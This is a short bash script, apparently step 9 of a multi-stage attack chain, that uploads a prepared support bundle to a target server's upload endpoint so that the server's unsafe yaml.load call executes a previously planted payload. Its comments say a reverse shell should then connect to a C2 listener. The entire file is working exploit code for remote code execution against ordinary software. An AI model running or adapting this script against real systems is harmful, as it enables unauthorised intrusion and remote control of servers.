#!/usr/bin/env bash
# Step 9: Trigger yaml.load by uploading a benign support-bundle.zip.
# The server will call DiagnosticEngine which loads active.yaml with
# yaml.Loader — executing the embedded payload.
# Usage: TARGET=<host:port> ./05-trigger.sh
TARGET="${TARGET:-localhost:8080}"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
BUNDLE="${SCRIPT_DIR}/benign-bundle.zip"

if [[ ! -f "$BUNDLE" ]]; then
  echo "[!] benign-bundle.zip not found. Run: cd attack && bash make-bundle.sh"
  exit 1
fi

echo "=== [Step 9] Trigger yaml.load (reverse shell should connect to C2) ==="
curl -s -X POST \
  "http://${TARGET}/support/upload" \
  -F "bundle=@${BUNDLE}"
echo ""
echo "[*] Request sent. Check the C2 listener for an incoming shell."
